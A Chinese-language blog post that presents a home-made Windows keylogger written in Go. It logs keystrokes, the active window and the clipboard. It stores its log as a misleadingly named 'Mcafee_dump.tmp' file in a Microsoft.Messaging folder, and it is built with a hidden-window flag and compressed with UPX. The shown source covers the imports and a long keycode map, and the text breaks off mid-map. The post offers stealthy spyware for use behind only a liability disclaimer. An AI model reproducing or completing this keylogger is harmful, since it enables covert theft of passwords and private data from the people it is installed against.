<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="声明由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。 文章作者拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经文章作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。 说明网上找了几款键盘记录工具都不好用,遂在其它开源基础上造一个轮子 功能:  记录时间">
<meta property="og:type" content="article">
<meta property="og:title" content="keylogger">
<meta property="og:url" content="http://wolvez.club/2019/10/12/keylogger/index.html">
<meta property="og:site_name" content="wolvez&#39;s blog">
<meta property="og:description" content="声明由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。 文章作者拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经文章作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。 说明网上找了几款键盘记录工具都不好用,遂在其它开源基础上造一个轮子 功能:  记录时间">
<meta property="og:locale" content="default">
<meta property="og:updated_time" content="2019-10-12T11:34:02.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="keylogger">
<meta name="twitter:description" content="声明由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。 文章作者拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经文章作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。 说明网上找了几款键盘记录工具都不好用,遂在其它开源基础上造一个轮子 功能:  记录时间">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon_wolv.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon_wolv.ico" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon_wolv.ico">
          
        
    
    <!-- title -->
    <title>keylogger</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- rss -->
    
    
</head>

<body>
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/Search/">Search</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2019/10/16/registry/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/09/19/mssql-command-tool/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://wolvez.club/2019/10/12/keylogger/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://wolvez.club/2019/10/12/keylogger/&text=keylogger"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://wolvez.club/2019/10/12/keylogger/&title=keylogger"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wolvez.club/2019/10/12/keylogger/&is_video=false&description=keylogger"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=keylogger&body=Check out this article: http://wolvez.club/2019/10/12/keylogger/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://wolvez.club/2019/10/12/keylogger/&title=keylogger"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://wolvez.club/2019/10/12/keylogger/&title=keylogger"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://wolvez.club/2019/10/12/keylogger/&title=keylogger"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://wolvez.club/2019/10/12/keylogger/&title=keylogger"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://wolvez.club/2019/10/12/keylogger/&name=keylogger&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#声明"><span class="toc-number">1.</span> <span class="toc-text">声明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#说明"><span class="toc-number">2.</span> <span class="toc-text">说明</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index width mx-auto px2 my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        keylogger
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">wolvez's blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2019-10-12T11:30:43.000Z" itemprop="datePublished">2019-10-12</time>
    </div>


      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h3 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h3><p>由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。</p>
<p>文章作者拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经文章作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。</p>
<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>网上找了几款键盘记录工具都不好用,遂在其它开源基础上造一个轮子</p>
<p><strong>功能:</strong></p>
<ol>
<li>记录时间</li>
<li>记录当前所在窗口</li>
<li>记录剪贴板</li>
</ol>
<p><strong>写得比较仓促缺乏测试,有bug或其它需求欢迎联系本人</strong></p>
<p><strong>记录内容保存在:</strong></p>
<p><code>C:\Users\[user]\AppData\Local\Packages\Microsoft.Messaging_8wekyb3d8bbwe\Mcafee_dump.tmp</code></p>
<p>编译方法:</p>
<p><code>go build -ldflags &quot;-s -w -H=windowsgui&quot; key.go</code><br> upx 压缩 :<br> <code>upx.exe -k -9 windowslogger.exe</code></p>
<figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"log"</span></span><br><span class="line">	<span class="string">"os"</span></span><br><span class="line">	<span class="string">"os/user"</span></span><br><span class="line">	<span class="string">"strings"</span></span><br><span class="line">	<span class="string">"syscall"</span></span><br><span class="line">	<span class="string">"time"</span></span><br><span class="line">	<span class="string">"unsafe"</span></span><br><span class="line"></span><br><span class="line">	<span class="string">"github.com/TheTitanrain/w32"</span></span><br><span class="line">	<span class="string">"github.com/atotto/clipboard"</span></span><br><span class="line">	<span class="string">"golang.org/x/sys/windows"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//未按shift</span></span><br><span class="line"><span class="keyword">var</span> keys_low = <span class="keyword">map</span>[<span class="keyword">uint16</span>]<span class="keyword">string</span>&#123;</span><br><span class="line">	<span class="number">8</span>:   <span class="string">"[Back]"</span>,</span><br><span class="line">	<span class="number">9</span>:   <span class="string">"[Tab]"</span>,</span><br><span class="line">	<span class="number">10</span>:  <span class="string">"[Shift]"</span>,</span><br><span class="line">	<span class="number">13</span>:  <span class="string">"[Enter]\r\n"</span>,</span><br><span class="line">	<span class="number">14</span>:  <span class="string">""</span>,</span><br><span class="line">	<span class="number">15</span>:  <span class="string">""</span>,</span><br><span class="line">	<span class="number">16</span>:  <span class="string">""</span>,</span><br><span class="line">	<span class="number">17</span>:  <span class="string">"[Ctrl]"</span>,</span><br><span class="line">	<span class="number">18</span>:  <span class="string">"[Alt]"</span>,</span><br><span class="line">	<span class="number">19</span>:  <span class="string">""</span>,</span><br><span class="line">	<span class="number">20</span>:  <span class="string">""</span>, <span class="comment">//CAPS LOCK</span></span><br><span class="line">	<span class="number">27</span>:  <span class="string">"[Esc]"</span>,</span><br><span class="line">	<span class="number">32</span>:  <span class="string">" "</span>, <span class="comment">//SPACE</span></span><br><span class="line">	<span class="number">33</span>:  <span class="string">"[PageUp]"</span>,</span><br><span class="line">	<span class="number">34</span>:  <span class="string">"[PageDown]"</span>,</span><br><span class="line">	<span class="number">35</span>:  <span class="string">"[End]"</span>,</span><br><span class="line">	<span class="number">36</span>:  <span class="string">"[Home]"</span>,</span><br><span class="line">	<span class="number">37</span>:  <span class="string">"[Left]"</span>,</span><br><span class="line">	<span class="number">38</span>:  <span class="string">"[Up]"</span>,</span><br><span class="line">	<span class="number">39</span>:  <span class="string">"[Right]"</span>,</span><br><span class="line">	<span class="number">40</span>:  <span class="string">"[Down]"</span>,</span><br><span class="line">	<span class="number">41</span>:  <span class="string">"[Select]"</span>,</span><br><span class="line">	<span class="number">42</span>:  <span class="string">"[Print]"</span>,</span><br><span class="line">	<span class="number">43</span>:  <span class="string">"[Execute]"</span>,</span><br><span class="line">	<span class="number">44</span>:  <span class="string">"[PrintScreen]"</span>,</span><br><span class="line">	<span class="number">45</span>:  <span class="string">"[Insert]"</span>,</span><br><span class="line">	<span class="number">46</span>:  <span class="string">"[Delete]"</span>,</span><br><span class="line">	<span class="number">47</span>:  <span class="string">"[Help]"</span>,</span><br><span class="line">	<span class="number">48</span>:  <span class="string">"0"</span>,</span><br><span class="line">	<span class="number">49</span>:  <span class="string">"1"</span>,</span><br><span class="line">	<span class="number">50</span>:  <span class="string">"2"</span>,</span><br><span class="line">	<span class="number">51</span>:  <span class="string">"3"</span>,</span><br><span class="line">	<span class="number">52</span>:  <span class="string">"4"</span>,</span><br><span class="line">	<span class="number">53</span>:  <span class="string">"5"</span>,</span><br><span class="line">	<span class="number">54</span>:  <span class="string">"6"</span>,</span><br><span class="line">	<span class="number">55</span>:  <span class="string">"7"</span>,</span><br><span class="line">	<span class="number">56</span>:  <span class="string">"8"</span>,</span><br><span class="line">	<span class="number">57</span>:  <span class="string">"9"</span>,</span><br><span class="line">	<span class="number">65</span>:  <span class="string">"a"</span>,</span><br><span class="line">	<span class="number">66</span>:  <span class="string">"b"</span>,</span><br><span class="line">	<span class="number">67</span>:  <span class="string">"c"</span>,</span><br><span class="line">	<span class="number">68</span>:  <span class="string">"d"</span>,</span><br><span class="line">	<span class="number">69</span>:  <span class="string">"e"</span>,</span><br><span class="line">	<span class="number">70</span>:  <span class="string">"f"</span>,</span><br><span class="line">	<span class="number">71</span>:  <span class="string">"g"</span>,</span><br><span class="line">	<span class="number">72</span>:  <span class="string">"h"</span>,</span><br><span class="line">	<span class="number">73</span>:  <span class="string">"i"</span>,</span><br><span class="line">	<span class="number">74</span>:  <span class="string">"j"</span>,</span><br><span class="line">	<span class="number">75</span>:  <span class="string">"k"</span>,</span><br><span class="line">	<span class="number">76</span>:  <span class="string">"l"</span>,</span><br><span class="line">	<span class="number">77</span>:  <span class="string">"m"</span>,</span><br><span class="line">	<span class="number">78</span>:  <span class="string">"n"</span>,</span><br><span class="line">	<span class="number">79</span>:  <span class="string">"o"</span>,</span><br><span class="line">	<span class="number">80</span>:  <span class="string">"p"</span>,</span><br><span class="line">	<span class="number">81</span>:  <span class="string">"q"</span>,</span><br><span class="line">	<span class="number">82</span>:  <span class="string">"r"</span>,</span><br><span class="line">	<span class="number">83</span>:  <span class="string">"s"</span>,</span><br><span class="line">	<span class="number">84</span>:  <span class="string">"t"</span>,</span><br><span class="line">	<span class="number">85</span>:  <span class="string">"u"</span>,</span><br><span class="line">	<span class="number">86</span>:  <span class="string">"v"</span>,</span><br><span class="line">	<span class="number">87</span>:  <span class="string">"w"</span>,</span><br><span class="line">	<span class="number">88</span>:  <span class="string">"x"</span>,</span><br><span class="line">	<span class="number">89</span>:  <span class="string">"y"</span>,</span><br><span class="line">	<span class="number">90</span>:  <span class="string">"z"</span>,</span><br><span class="line">	<span class="number">91</span>:  <span class="string">"[Windows]"</span>,</span><br><span class="line">	<span class="number">92</span>:  <span class="string">"[Windows]"</span>,</span><br><span class="line">	<span class="number">93</span>:  <span class="string">"[Applications]"</span>,</span><br><span class="line">	<span class="number">94</span>:  <span class="string">""</span>,</span><br><span class="line">	<span class="number">95</span>:  <span class="string">"[Sleep]"</span>,</span><br><span class="line">	<span class="number">96</span>:  <span class="string">"0"</span>,</span><br><span class="line">	<span class="number">97</span>:  <span class="string">"1"</span>,</span><br><span class="line">	<span class="number">98</span>:  <span class="string">"2"</span>,</span><br><span class="line">	<span class="number">99</span>:  <span class="string">"3"</span>,</span><br><span class="line">	<span class="number">100</span>: <span class="string">"4"</span>,</span><br><span class="line">	<span class="number">101</span>: <span class="string">"5"</span>,</span><br><span class="line">	<span class="number">102</span>: <span class="string">"6"</span>,</span><br><span class="line">	<span class="number">103</span>: <span class="string">"7"</span>,</span><br><span class="line">	<span class="number">104</span>: <span class="string">"8"</span>,</span><br><span class="line">	<span class="number">105</span>: <span class="string">"9"</span>,</span><br><span class="line">	<span class="number">106</span>: <span class="string">"*"</span>,</span><br><span class="line">	<span class="number">107</span>: <span class="string">"+"</span>,</span><br><span class="line">	<span class="number">108</span>: <span class="string">"[Separator]"</span>,</span><br><span class="line">	<span class="number">109</span>: <span class="string">"-"</span>,</span><br><span class="line">	<span class="number">110</span>: <span class="string">"."</span>,</span><br><span class="line">	<span class="number">111</span>: <span class="string">"[Divide]"</span>,</span><br><span class="line">	<span class="number">112</span>: <span class="string">"[F1]"</span>,</span><br><span class="line">	<span class="number">113</span>: <span class="string">"[F2]"</span>,</span><br><span class="line">	<span class="number">114</span>: <span class="string">"[F3]"</span>,</span><br><span class="line">	<span class="number">115</span>: <span class="string">"[F4]"</span>,</span><br><span class="line">	<span class="number">116</span>: <span class="string">"[F5]"</span>,</span><br><span class="line">	<span class="number">117</span>: <span class="string">"[F6]"</span>,</span><br><span class="line">	<span class="number">118</span>: <span class="string">"[F7]"</span>,</span><br><span class="line">	<span class="number">119</span>: <span class="string">"[F8]"</span>,</span><br><span class="line">	<span class="number">120</span>: <span class="string">"[F9]"</span>,</span><br><span class="line">	<span class="number">121</span>: <span class="string">"[F10]"</span>,</span><br><span class="line">	<span class="number">122</span>: <span 